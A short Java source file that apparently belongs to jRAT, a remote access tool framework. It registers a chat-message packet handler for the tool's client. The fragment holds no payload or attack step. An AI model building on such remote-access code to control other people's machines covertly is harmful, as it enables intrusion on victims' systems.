package jrat.module.chat;

import jrat.api.Module;
import jrat.client.packets.incoming.IncomingPackets;

public class ChatClientModule extends Module {

    public static FrameChat instance;

    public void init() throws Exception {
        IncomingPackets.register((short) 51, PacketChatAction.class);

    }
}
